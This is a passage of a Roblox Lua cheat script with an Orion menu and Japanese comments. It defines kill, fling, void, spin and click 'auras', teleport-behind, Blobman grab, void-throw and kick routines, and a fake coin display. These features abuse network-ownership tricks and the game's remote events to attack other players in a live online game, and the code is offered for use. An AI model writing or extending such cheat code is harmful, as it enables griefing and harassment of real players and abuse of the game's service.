                                        CreateGrabLine:FireServer(targetRoot, targetRoot.CFrame * CFrame.new(0, 0, -2))
                                        
                                        task.wait(0.08) -- 掴み安定用
                                    end
                                end
                            end
                        end
                    end
                    
                    task.wait(0.25)
                end
            end)
        end
    end
})

-- 範囲スライダー（全Aura共通で使用）
AuraTab:AddSlider({
    Name = "Aura Range",
    Min = 10,
    Max = 120,
    Default = 70,
    Increment = 5,
    ValueName = " studs",
    Save = true,
    Flag = "AuraRadius",
    Callback = function(Value)
        int.AuraRadius = Value
    end    
})

-- Void Aura
AuraTab:AddSection({ Name = "<b>Void Aura</b>" })

AuraTab:AddToggle({
    Name = "Void Aura",
    Default = false,
    Save = true,
    Flag = "VoidAura",
    Callback = function(v)
        bool.VoidAura = v
        cons:disc("VoidAura")

        if v then
            cons["VoidAura"] = task.spawn(function()
                while bool.VoidAura do
                    local myChar = plr.Character
                    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    
                    if myRoot then
                        for _, player in ipairs(Players:GetPlayers()) do
                            if player ~= plr and player.Character then
                                local targetChar = player.Character
                                local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
                                
                                if targetRoot and (targetRoot.Position - myRoot.Position).Magnitude <= (int.AuraRadius or 50) then
                                    sno(targetRoot)  -- 取得網路擁有權
                                    targetRoot.AssemblyLinearVelocity = Vector3.new(0, 10000, 0)
                                    
                                    local bv = Instance.new("BodyVelocity")
                                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    bv.Velocity = Vector3.new(0, 10000, 0)
                                    bv.Parent = targetRoot
                                    Debris:AddItem(bv, 0.1)
                                end
                            end
                        end
                    end
                    
                    task.wait(0.5)
                end
            end)
        end
    end
})
    
        AuraTab:AddSection({
        Name = "Auras"
    })
    
    AuraTab:AddToggle({
    Name = "Kill Aura",
    Default = false,
    Callback = function(Value)
        bool.KillGrabAura = Value  
        if bool.KillGrabAura then  
            while bool.KillGrabAura do 
                task.wait() 
                for _, v in pairs(game.Players:GetPlayers()) do 
                    task.wait() 
                    if v ~= plr and not IsFriend(v) and bool.KillGrabAura 
                       and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then  
                        
                        local v1 = v.Character 
                        local v2 = v1 and v1:FindFirstChild("HumanoidRootPart")  
                        
                        if v2 and GetMagnitude(hrp, v2) <= 40 then   -- 距離40以内
                            
                            -- 自動で掴む
                            pcall(function()
                                sno(v2)        -- Fling Auraで使ってる掴み関数をそのまま使用
                            end)
                            
                            task.wait(0.08)
                            
                            -- キル処理
                            pcall(function()
                                local Weld = v1:FindFirstChild("GrabPart", true) 
                                local part = v2
                                
                                if v1:FindFirstChild("Humanoid") then
                                    v1.Humanoid.Health = 0
                                end
                                
                                DestroyGrabLine:FireServer(part)
                                SetNetworkOwner:FireServer(part, part.CFrame)
                            end)
                        end
                    end
                end
            end
        end
    end
})

    local function IsFriend(player)
        if not player or not player.UserId then return false end
        local success, result = pcall(function()
            return plr:IsFriendsWith(player.UserId)
        end)
        if success then
            return result
        else
            return false
        end
    end


    AuraTab:AddSlider({ Name = "Fling Aura Power", Min = 600, Max = 10000, Default = 600, Color = Color3.fromRGB(255, 80, 80), Increment = 100, ValueName = "S", Save = true, Flag = "FlingAuraStrength", Callback = function(Value) int.flingPwr = Value end })
    AuraTab:AddToggle({
        Name = "Fling Aura",
        Default = false,
        Callback = function(Value)
            bool.FlingAura = Value  
            if bool.FlingAura then  
                while bool.FlingAura do 
                    task.wait() 
                    for _,v in pairs(game.Players:GetPlayers()) do 
                        task.wait() 
                        if v ~= plr and not IsFriend(v) and bool.FlingAura and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then  
                            local v1 = v.Character 
                            local v2 = v1 and v1:FindFirstChild("HumanoidRootPart")  
                            if v2 and GetMagnitude(hrp,v2) <= 40 then  
                                sno(v2)
                                task.wait()
                                if not v2:FindFirstChild("BodyVelocity") then  
                                    local bv = Instance.new("BodyVelocity") 
                                    bv.MaxForce = Vector3.new(Huge())
                                    local direction = hrp.CFrame.LookVector
                                    bv.Velocity = direction * int.flingPwr
                                    bv.Parent = v2
                                end
                            end
                        end
                    end
                end
            end
        end
    })
    
    

    AuraTab:AddToggle({
        Name = "Click Aura",
        Default = false,
        Callback = function(Value)
            bool.ClickAura = Value  
            if bool.ClickAura then  
                while bool.ClickAura do 
                    task.wait() 
                    for _,v in pairs(game.Players:GetPlayers()) do 
                        task.wait() 
                        if v ~= plr and not IsFriend(v) and  bool.ClickAura and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then  
                            local v1 = v.Character 
                            local v2 = v1 and v1:FindFirstChild("HumanoidRootPart")  
                            if v2 and GetMagnitude(hrp,v2) <= 40 then  
                                sno(v2)
                                task.wait()
                            end
                        end
                    end
                end
            end
        end
    })

    AuraTab:AddToggle({
        Name = "anti-antikick Aura",
        Default = false,
        Callback = function(Value)
            bool.AntiKickAura = Value 
            local parts,ParentName,SoundPart
            while bool.AntiKickAura and task.wait(0.05) do 
                parts = Workspace:GetPartBoundsInRadius(hrp.Position,35)
                for _,v in pairs(parts) do 
                    local ParentName = v.Parent and v.Parent.Name
                    if ParentName == "NinjaShuriken" or ParentName == "NinjaKunai" then 
                        SoundPart = v.Parent:FindFirstChild("SoundPart") 
                        if SoundPart then 
                            sno(SoundPart)
                        end
                    end
                end 
            end 
        end
    })
    

-- === SPIN AURA SETTINGS ===
AuraTab:AddSection({Name = "Spin Aura"})

AuraTab:AddToggle({
    Name = "Spin Aura",
    Default = false,
    Callback = function(Value)
        bool.SpinAura = Value

        if not Value then
            for _, v in pairs(game.Players:GetPlayers()) do
                if v ~= plr then
                    local char = v.Character
                    if not char then continue end
                    for _, obj in pairs(char:GetDescendants()) do
                        if obj.Name == "SpinBP" or obj.Name == "SpinBG" then
                            obj:Destroy()
                        end
                    end
                end
            end
            return
        end

        task.spawn(function()
            while bool.SpinAura do
                local root = hrp
                if not root or not root.Parent then
                    task.wait(0.1)
                    continue
                end

                for _, v in pairs(game.Players:GetPlayers()) do
                    if v == plr or IsFriend(v) then continue end

                    local char = v.Character
                    if not char then continue end

                    local vRoot = char:FindFirstChild("HumanoidRootPart")
                    if not vRoot then continue end

                    local dist = GetMagnitude(root, vRoot)
                    if dist > 60 then
                        local bp = vRoot:FindFirstChild("SpinBP")
                        local bg = vRoot:FindFirstChild("SpinBG")
                        if bp then bp:Destroy() end
                        if bg then bg:Destroy() end
                        continue
                    end

                    -- 所有権取得
                    sno(vRoot)

                    local bp = vRoot:FindFirstChild("SpinBP")
                    if not bp then
                        bp = Instance.new("BodyPosition")
                        bp.Name = "SpinBP"
                        bp.Parent = vRoot
                    end
                    bp.MaxForce = Vector3.new(40000, 40000, 40000)
                    bp.D = 200
                    bp.P = 15000

                    local bg = vRoot:FindFirstChild("SpinBG")
                    if not bg then
                        bg = Instance.new("BodyGyro")
                        bg.Name = "SpinBG"
                        bg.Parent = vRoot
                    end
                    bg.MaxTorque = Vector3.new(0, math.huge, 0)
                    bg.D = 100
                    bg.P = 12000

                    local angle = tick() * (int.SpinSpeed / 30)
                    local targetPos = root.Position + Vector3.new(
                        math.cos(angle) * int.SpinRadius,
                        10,
                        math.sin(angle) * int.SpinRadius
                    )

                    bp.Position = targetPos
                    bg.CFrame = CFrame.new(vRoot.Position, root.Position)
                        * CFrame.Angles(0, math.rad(int.SpinSpeed / 8), 0)
                end

                task.wait()
            end

            -- オフ時クリーンアップ
            for _, v in pairs(game.Players:GetPlayers()) do
                if v ~= plr then
                    local char = v.Character
                    if not char then continue end
                    for _, obj in pairs(char:GetDescendants()) do
                        if obj.Name == "SpinBP" or obj.Name == "SpinBG" then
                            obj:Destroy()
                        end
                    end
                end
            end
        end)
    end
})

AuraTab:AddSlider({
    Name = "Spin Speed",
    Min = 50,
    Max = 800,
    Default = 250,
    Color = Color3.fromRGB(255, 170, 0),
    Increment = 10,
    ValueName = "Speed",
    Save = true,
    Flag = "SpinAuraSpeed",
    Callback = function(Value)
        int.SpinSpeed = Value
    end
})

AuraTab:AddSlider({
    Name = "Spin Radius",
    Min = 5,
    Max = 25,
    Default = 12,
    Color = Color3.fromRGB(0, 170, 255),
    Increment = 1,
    ValueName = "Studs",
    Save = true,
    Flag = "SpinAuraRadius",
    Callback = function(Value)
        int.SpinRadius = Value
    end
})

CoinTab:AddSection({ Name = "<b>Fake Coins</b>" })

local fakeCoinValue = "999999"

CoinTab:AddTextbox({
    Name = "Fake Coin Amount",
    Default = "999999",
    TextDisappear = false,
    Callback = function(Value)
        fakeCoinValue = Value
    end
})

CoinTab:AddButton({
    Name = "Set Fake Coins",
    Callback = function()
        local amount = tonumber(fakeCoinValue)
        if not amount then
            Notify("Error", "Please enter a valid number!")
            return
        end

        local success = pcall(function()
            -- Main path
            local coinsDisplay = plr.PlayerGui:FindFirstChild("MenuGui", true)
                and plr.PlayerGui.MenuGui:FindFirstChild("TopRight", true)
                and plr.PlayerGui.MenuGui.TopRight:FindFirstChild("CoinsFrame", true)
                and plr.PlayerGui.MenuGui.TopRight.CoinsFrame:FindFirstChild("CoinsDisplay", true)
                and plr.PlayerGui.MenuGui.TopRight.CoinsFrame.CoinsDisplay:FindFirstChild("Coins")

            if coinsDisplay then
                coinsDisplay.Text = tostring(amount)
                Notify("Success", "Coins set to: " .. amount)
            else
                Notify("Error", "Could not find coin display")
            end
        end)

        if not success then
            Notify("Error", "Failed to set fake coins")
        end
    end
})

CoinTab:AddButton({
    Name = "Reset to Real Coins",
    Callback = function()
        local success = pcall(function()
            -- Get real coin amount from leaderstats
            local leaderstats = plr:FindFirstChild("leaderstats")
            local realCoins = leaderstats and leaderstats:FindFirstChild("Coins")

            local coinsDisplay = plr.PlayerGui:FindFirstChild("MenuGui", true)
                and plr.PlayerGui.MenuGui:FindFirstChild("TopRight", true)
                and plr.PlayerGui.MenuGui.TopRight:FindFirstChild("CoinsFrame", true)
                and plr.PlayerGui.MenuGui.TopRight.CoinsFrame:FindFirstChild("CoinsDisplay", true)
                and plr.PlayerGui.MenuGui.TopRight.CoinsFrame.CoinsDisplay:FindFirstChild("Coins")

            if coinsDisplay and realCoins then
                coinsDisplay.Text = tostring(realCoins.Value)
                Notify("Success", "Coins reset to real amount: " .. realCoins.Value)
            elseif coinsDisplay then
                Notify("Warning", "Real coins not found, but display reset attempted")
            else
                Notify("Error", "Coin display not found")
            end
        end)

        if not success then
            Notify("Error", "Failed to reset coins")
        end
    end
})

CoinTab:AddButton({
    Name = "Refresh Real Coins",
    Callback = function()
        Notify("Info", "Real coin value refreshed from leaderstats")
    end
})

local SelectedTPPlayer = nil
local TPDropdown


local function GetTPList()

    local list = {}

    for _,p in pairs(Players:GetPlayers()) do
        if p ~= plr then
            table.insert(list, p.Name)
        end
    end

    return list
end

TPDropdown = TeleportTab:AddDropdown({
    Name = "Teleport Behind Player",
    Options = GetTPList(),
    Default = "",
    Callback = function(Value)
        SelectedTPPlayer = Players:FindFirstChild(Value)
    end
})

TeleportTab:AddButton({
    Name = "Refresh",
    Callback = function()
        TPDropdown:Refresh(GetTPList(), true)
    end
})

TeleportTab:AddButton({
    Name = "TP Behind",
    Callback = function()

        if not SelectedTPPlayer then
            warn("No player selected.")
            return
        end

        local targetChar = SelectedTPPlayer.Character
        local myChar = plr.Character

        if not targetChar or not myChar then
            return
        end

        local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")

        if not targetRoot or not myRoot then
            return
        end

        -- 相手の後ろにTP
        myRoot.CFrame = targetRoot.CFrame * CFrame.new(0, 0, -6)

    end
})

    ServerTab:AddSection({Name = "Blobman"})
    
    ServerTab:AddParagraph("NOTE", [[
<font color="#00FF00"><b>[TARGET]</b></font> ターゲットタブからターゲットを選んでキックしてください。
]])

ServerTab:AddButton({
    Name = "Blobman Grab (Left)",
    Callback = function()
        if not selectedPlrName then 
            OrionLib:MakeNotification({Name = "Error", Content = "プレイヤーが選択されていません", Image = "x", Time = 3})
            return 
        end

        local target = Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            OrionLib:MakeNotification({Name = "Error", Content = "対象が見つかりません", Image = "x", Time = 3})
            return
        end

        local targetHRP = target.Character.HumanoidRootPart
        local myHRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end

        OrionLib:MakeNotification({Name = "Left Grab", Content = "ちょいまて", Image = "x", Time = 2})

        -- 左手で掴む関数
        local function BringLeft(name)
            local blob = FindBlob()
            local root = Players[name] and Players[name].Character and Players[name].Character:FindFirstChild("HumanoidRootPart")
            if not blob or not root then return end
            pcall(function()
                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                    blob.LeftDetector,
                    root,
                    blob.LeftDetector.LeftWeld
                )
            end)
        end

        -- 左手で掴む
        BringLeft(selectedPlrName)
        task.wait(0.6)

        -- 相手の位置までTP
        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 5, 0)
        task.wait(0.5)

        -- もう一度左手で掴む
        BringLeft(selectedPlrName)
        task.wait(0.7)

        OrionLib:MakeNotification({Name = "Success", Content = selectedPlrName .. " を左手で掴みました", Image = "x", Time = 3})
    end    
})

ServerTab:AddButton({
    Name = "Blobman Grab (Right)",
    Callback = function()
        if not selectedPlrName then 
            OrionLib:MakeNotification({Name = "Error", Content = "プレイヤーが選択されていません", Image = "x", Time = 3})
            return 
        end

        local target = Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            OrionLib:MakeNotification({Name = "Error", Content = "対象が見つかりません", Image = "x", Time = 3})
            return
        end

        local targetHRP = target.Character.HumanoidRootPart
        local myHRP = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end

        OrionLib:MakeNotification({Name = "Rigth Grab", Content = "ちょいまて", Image = "x", Time = 2})

        -- 右手で掴む関数
        local function BringRight(name)
            local blob = FindBlob()
            local root = Players[name] and Players[name].Character and Players[name].Character:FindFirstChild("HumanoidRootPart")
            if not blob or not root then return end
            pcall(function()
                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                    blob.RightDetector,
                    root,
                    blob.RightDetector.RightWeld
                )
            end)
        end

        -- 右手で掴む
        BringRight(selectedPlrName)
        task.wait(0.6)

        -- 相手の位置までTP
        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 5, 0)
        task.wait(0.5)

        -- もう一度右手で掴む
        BringRight(selectedPlrName)
        task.wait(0.7)

        OrionLib:MakeNotification({Name = "Success", Content = selectedPlrName .. " を右手で掴みました", Image = "x", Time = 3})
    end    
})

ServerTab:AddButton({
    Name = "Blobman Void Grab",
    Callback = function()

        local target = Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "対象が見つかりません",
                Image = "x",
                Time = 3
            })
            return
        end

        local targetHRP = target.Character.HumanoidRootPart
        local myChar = Players.LocalPlayer.Character
        local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
        if not myHRP then return end

        local originalCFrame = myHRP.CFrame

        OrionLib:MakeNotification({
            Name = "Void Grab",
            Content = "投げるね",
            Image = "x",
            Time = 2
        })

        local function BringLeft(name)
            local blob = FindBlob()
            local plr = Players:FindFirstChild(name)
            local root = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if not blob or not root then return end

            pcall(function()
                blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(
                    blob.LeftDetector,
                    root,
                    blob.LeftDetector.LeftWeld
                )
            end)
        end

        local function ReleaseLeft(name)
            local blob = FindBlob()
            local plr = Players:FindFirstChild(name)
            local root = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if not blob or not root then return end

            pcall(function()
                blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(
                    blob.LeftDetector.LeftWeld,
                    root
                )
            end)
        end

        BringLeft(selectedPlrName)
        task.wait(0.45)

        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 5, 0)
        task.wait(0.35)

        BringLeft(selectedPlrName)
        task.wait(0.25)

        ReleaseLeft(selectedPlrName)

        task.wait(0.1)

        myHRP.CFrame = originalCFrame

        OrionLib:MakeNotification({
            Name = "Success",
            Content = selectedPlrName .. " を奈落に投げたよw",
            Image = "x",
            Time = 3
        })
    end
})

ServerTab:AddButton({
    Name = "Just Grab",
    Callback = function()
        if not selectedPlrName then 
            OrionLib:MakeNotification({Name = "Error", Content = "プレイヤーが選択されていません", Image = "x", Time = 3})
            return 
        end

        local target = Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            OrionLib:MakeNotification({Name = "Error", Content = "対象が見つかりません", Image = "x", Time = 3})
            return
        end

        local targetHRP = target.Character.HumanoidRootPart
        local myHRP = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

        if not myHRP then return end

        -- ==================== ブロブマン生成 & 乗る ====================
        OrionLib:MakeNotification({Name = "Just Grab", Content = "ちょいまて", Image = "x", Time = 2})

        -- ゲームによってブロブマンの生成方法が違うので、よくあるパターンを複数試す
        BringRight(selectedPlrName)  -- 元の関数も一応呼ぶ

        task.wait(0.6)

        -- ブロブマンに乗る処理（調整が必要な場合が多い）
        pcall(function()
            local blob = game.Players.LocalPlayer.Character:FindFirstChild("Blobman") or 
                        game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Model")
            
            if blob and blob:FindFirstChild("Humanoid") then
                blob.Humanoid.Sit = true
            end
        end)

        task.wait(0.8)

        -- ==================== 相手の位置までTP ====================
        local originalCFrame = myHRP.CFrame  -- 元の位置を記憶

        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 5, 0)  -- 少し上にTP
        task.wait(0.5)

        -- ==================== 掴む ====================
        -- ここはあなたのゲームの掴み関数に合わせて調整してください
        BringRight(selectedPlrName)   -- 再度掴み実行

        task.wait(0.7)

        -- ==================== 自分の位置に戻る ====================
        myHRP.CFrame = originalCFrame
        OrionLib:MakeNotification({Name = "Success", Content = selectedPlrName .. " を掴んで戻りました", Image = "x", Time = 3})
    end    
})

-- Blobmanを探す関数（安全版）
local function FindBlob()
    local folder = Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    if folder then
        return folder:FindFirstChild("CreatureBlobman")
    end
    return nil
end

ServerTab:AddButton({
    Name = "Bug in Hand",
    Callback = function()
        if not selectedPlrName then 
            OrionLib:MakeNotification({Name = "Error", Content = "プレイヤーが選択されていません", Image = "x", Time = 3})
            return 
        end

        local targetPlr = game.Players:FindFirstChild(selectedPlrName)
        if not targetPlr or not targetPlr.Character or not targetPlr.Character:FindFirstChild("HumanoidRootPart") then
            OrionLib:MakeNotification({Name = "Error", Content = "対象のキャラクターが見つかりません", Image = "x", Time = 3})
            return
        end

        local blob = FindBlob()
        if not blob then
            OrionLib:MakeNotification({Name = "Error", Content = "Blobmanが見つかりません", Image = "x", Time = 3})
            return
        end

        local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
        if not script then return end

        local CreatureGrab = script:FindFirstChild("CreatureGrab")
        local RightDetector = blob:FindFirstChild("RightDetector")
        local LeftDetector = blob:FindFirstChild("LeftDetector")
        local RightWeld = RightDetector and RightDetector:FindFirstChild("RightWeld")
        local LeftWeld = LeftDetector and LeftDetector:FindFirstChild("LeftWeld")

        if not (CreatureGrab and RightDetector and LeftDetector) then
            OrionLib:MakeNotification({Name = "Error", Content = "Blobmanの部位が見つかりません", Image = "x", Time = 3})
            return
        end

        OrionLib:MakeNotification({Name = "Bug in Hand", Content = "実行中...", Image = "warning", Time = 4})

        -- Decoyを使ってバグを発生させる（右→左）
        for hand = 1, 2 do
            local detector = hand == 1 and RightDetector or LeftDetector
            local weld = hand == 1 and RightWeld or LeftWeld

            local decoy = SpawnToy("YouDecoy")
            if decoy then
                repeat
                    task.wait(0.06)
                    pcall(function()
                        CreatureGrab:FireServer(detector, decoy:WaitForChild("HumanoidRootPart", 2), weld)
                    end)
                until (weld and weld.Attachment0) or not hum.SeatPart
                task.wait(0.1)
                DestroyToy:FireServer(decoy)
            end
            task.wait(0.15)
        end

        -- 本命：対象プレイヤーを両手で掴む
        local root = targetPlr.Character.HumanoidRootPart

        pcall(function()
            CreatureGrab:FireServer(RightDetector, root, RightWeld)
            task.wait(0.08)
            CreatureGrab:FireServer(LeftDetector, root, LeftWeld)
        end)

        task.wait(0.2)

        OrionLib:MakeNotification({
            Name = "Bug in Hand", 
            Content = "✅ " .. selectedPlrName .. " をBug掴みしました", 
            Image = "check", 
            Time = 5
        })
    end    
})

    TarTab:AddDropdown({
        Name = "BUTTON KICKS MODE",
        Default = "[BASE]",
        Options = {"[BASE]","[BLITZ]"},
        Callback = function(Value)
            int.selectedButtonMode = Value
        end    
    })

    local Config = {
        Running = false,
        Range = 40,
        ToyName = "CreatureBlobman"
    }

    local function getInv()
        return workspace:FindFirstChild(plr.Name.."SpawnedInToys") or workspace:WaitForChild(plr.Name.."SpawnedInToys")
    end

    local function GetCharacter()
        return plr.Character
    end

    local function getLocalHum()
        local char = GetCharacter()
        return char and char:FindFirstChildOfClass("Humanoid")
    end

    local function getCharInfo()
        local char = GetCharacter()
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        return char, hrp
    end

    local function SPNTOY(name, cf)
        if not CanSpawnToy.Value then
            CanSpawnToy:GetPropertyChangedSignal("Value"):Wait()
        end
        local SpawnCF = (etc.MyPCLD or hrp).CFrame * CFrame.new(0,14,20)
        task.spawn(SpawnToyRemote.InvokeServer, SpawnToyRemote, name, SpawnCF, Vector3.zero)
        local container = InOwnedPlot.Value and CheckForHome() or inv
        local start = tick()
        local obj
        repeat task.wait() until (container:FindFirstChild(name) or (tick()-start)>2.5)
        return container:FindFirstChild(name)
    end

    ServerTab:AddToggle({
        Name = "Kill Aura",
        Default = false,
        Callback = function(Value)
            Config.Running = Value
            local function spawnBlobmanIfNeeded()
                local invFolder = getInv()
                if not invFolder then return nil end
                
                local existing = invFolder:FindFirstChild(Config.ToyName)
                if existing then return existing end
                
                local char = GetCharacter()
                if char and char:FindFirstChild("Head") then
                    pcall(function()
                        SPNTOY(Config.ToyName, char.Head.CFrame)
                    end)
                end
                
                return invFolder:WaitForChild(Config.ToyName, 5)
            end

            local function sitOnBlobman(blobman)
                if not blobman then return end
                local seat = blobman:FindFirstChildWhichIsA("VehicleSeat", true)
                local hum = getLocalHum()
                if seat and hum and not seat.Occupant then
                    task.wait(0.1)
                    pcall(function() seat:Sit(hum) end)
                end
            end

            local function runKillAura()
                local hpToggle = false
                while Config.Running do
                    task.wait(0.01)
                    local _, hrp = getCharInfo()
                    if not hrp then continue end
                    
                    local blobman = spawnBlobmanIfNeeded()
                    if not blobman then continue end
                    
                    sitOnBlobman(blobman)
                    
                    local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                    local detector = blobman:FindFirstChild("LeftDetector")
                    local weld = detector and detector:FindFirstChild("LeftWeld")
                    
                    if scriptFolder and detector and weld then
                        local CreatureGrab = scriptFolder:FindFirstChild("CreatureGrab")
                        local CreatureRelease = scriptFolder:FindFirstChild("CreatureRelease")
                        local CreatureDrop = scriptFolder:FindFirstChild("CreatureDrop")
                        
                        if CreatureGrab and CreatureRelease and CreatureDrop then
                            hpToggle = not hpToggle
                            for _, plrTarget in ipairs(Players:GetPlayers()) do
                                if not Config.Running then break end
                                
                                if plrTarget ~= plr then
                                    local targetChar = plrTarget.Character
                                    local thrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                                    local thum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
                                    
                                    if thrp and thum and (hrp.Position - thrp.Position).Magnitude <= Config.Range then
                                        pcall(function()
                                            CreatureGrab:FireServer(detector, thrp, weld)
                                            CreatureRelease:FireServer(weld, thrp)
                                            CreatureDrop:FireServer(weld, thrp)
                                            
                                            thum.Health = hpToggle and 0 or 100
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end

            if Value then
                task.spawn(runKillAura)
            end
        end
    })
    
    ServerTab:AddToggle({
    Name = "Kill Aura (teleport)",
    Default = false,
    Callback = function(Value)
        Config.Running = Value
        
        local function spawnBlobmanIfNeeded()
            local invFolder = getInv()
            if not invFolder then return nil end
            
            local existing = invFolder:FindFirstChild(Config.ToyName)
            if existing then return existing end
            
            local char = GetCharacter()
            if char and char:FindFirstChild("Head") then
                pcall(function()
                    SPNTOY(Config.ToyName, char.Head.CFrame)
                end)
            end
            
            return invFolder:WaitForChild(Config.ToyName, 5)
        end

        local function sitOnBlobman(blobman)
            if not blobman then return end
            local seat = blobman:FindFirstChildWhichIsA("VehicleSeat", true)
            local hum = getLocalHum()
            if seat and hum and not seat.Occupant then
                task.wait(0.1)
                pcall(function() seat:Sit(hum) end)
            end
        end

        local function runKillAura()
            local hpToggle = false
            while Config.Running do
                task.wait(0.01)
                local _, hrp = getCharInfo()
                if not hrp then continue end
                
                local blobman = spawnBlobmanIfNeeded()
                if not blobman then continue end
                
                sitOnBlobman(blobman)
                
                local scriptFolder = blobman:FindFirstChild("BlobmanSeatAndOwnerScript")
                local detector = blobman:FindFirstChild("LeftDetector")
                local weld = detector and detector:FindFirstChild("LeftWeld")
                
                if scriptFolder and detector and weld then
                    local CreatureGrab = scriptFolder:FindFirstChild("CreatureGrab")
                    local CreatureRelease = scriptFolder:FindFirstChild("CreatureRelease")
                    local CreatureDrop = scriptFolder:FindFirstChild("CreatureDrop")
                    
                    if CreatureGrab and CreatureRelease and CreatureDrop then
                        hpToggle = not hpToggle
                        for _, plrTarget in ipairs(Players:GetPlayers()) do
                            if not Config.Running then break end
                            
                            if plrTarget ~= plr then
                                local targetChar = plrTarget.Character
                                local thrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                                local thum = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
                                
                                if thrp and thum and (hrp.Position - thrp.Position).Magnitude <= Config.Range then
                                    pcall(function()
                                        CreatureGrab:FireServer(detector, thrp, weld)
                                        CreatureRelease:FireServer(weld, thrp)
                                        CreatureDrop:FireServer(weld, thrp)
                                        
                                        thum.Health = hpToggle and 0 or 100
                                    end)
                                end
                            end
                        end
                    end
                end
                
                -- 【追加】サーバー全員に順番にテレポート
                local localChar = GetCharacter()
                local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
                if localHRP then
                    for _, plrTarget in ipairs(Players:GetPlayers()) do
                        if not Config.Running then break end
                        if plrTarget ~= plr then
                            local targetChar = plrTarget.Character
                            local thrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                            if thrp then
                                pcall(function()
                                    localHRP.CFrame = thrp.CFrame + Vector3.new(0, 5, 0)
                                end)
                                task.wait(0.30)  -- TPの間隔（調整可能）
                            end
                        end
                    end
                end
            end
        end

        if Value then
            task.spawn(runKillAura)
        end
    end
})
                     
    ServerTab:AddButton({
        Name = "Target Kick [V1]",
        Callback = function()
            local blob = FindBlob()
            etc.Root = game.Players[selectedPlrName].Character.HumanoidRootPart
            local oldCF = char:GetPivot()
            if not etc.Root then return end  
            if not blob then 
                blob = SpawnToy("CreatureBlobman")
                if not blob then return end 
                local Seat = FWD(blob,"VehicleSeat")
                Seat:Sit(hum)
                while Seat.Occupant ~= hum do task.wait() end 
            end
            local RightDetector,RightWeld = blob:FindFirstChild("RightDetector"), blob.RightDetector and blob.RightDetector:FindFirstChild("RightWeld")
            local CreatureGrab,CreatureDrop,CreatureRelease = blob.BlobmanSeatAndOwnerScript.CreatureGrab,blob.BlobmanSeatAndOwnerScript.CreatureDrop,blob.BlobmanSeatAndOwnerScript.CreatureRelease
            repeat
                char:PivotTo(etc.Root.CFrame * CFrame.new(0,10,5) * CFrame.new(etc.Root.AssemblyLinearVelocity * 0.4))
                CreatureGrab:FireServer(RightDetector,etc.Root,RightWeld)
                task.wait(0.05)
            until RightWeld.Attachment0 or not hum.SeatPart
            if RightWeld.Attachment0 then 
                CreatureRelease:FireServer(RightWeld,etc["Root"])
                -- for _ = 1,5 do 
                --     CreatureGrab:FireServer(RightDetector,etc["Root"],RightWeld)
                --     CreatureRelease:FireServer(RightWeld,etc["Root"])
                --     if isnetworkowner(etc["Root"]) then 
                --         etc["Root"].Parent:PivotTo(oldCF * CFrame.new(0,20,0))
                --     end
                --     RunService.Stepped:Wait()
                -- end
                if isnetworkowner(etc["Root"]) then 
                    for _,v in pairs(etc["Root"].Parent) do 
                        if v:IsA("BasePart") then 
                            v.CFrame = oldCF * CFrame.new(0,20,0)
                        end
                    end
                end
                char:PivotTo(oldCF)
                while not CheckNetworkOwnerOnPlayer(_,etc["Root"]) and RunService.Stepped:Wait() and hum.SeatPart do 
                    sno(etc["Root"])
                end
                etc["Root"].Parent:PivotTo(oldCF * CFrame.new(0,20,0))
                StopAllVelocity(etc["Root"].Parent)
                repeat
                    CreatureGrab:FireServer(RightDetector,etc["Root"],RightWeld)
                    task.wait(0.05)
                until RightWeld.Attachment0 or not hum.SeatPart
                for _ = 1,5 do 
                    unsno(etc["Root"])
                end
                if int.selectedButtonMode == "[BLITZ]" then 
                    task.wait(1) 
                    DestroyToy:FireServer(blob)
                    etc.LastBlob = nil
                end
            end
        end    
    })

    ServerTab:AddButton({
        Name = "🔴 STOP",
        Callback = function()
            bool.Running = false
        end    
    })
   
ServerTab:AddButton({
    Name = "blobman Kick",
    Callback = function()
        local blob = FindBlob()
        local oldCF = char:GetPivot()
        
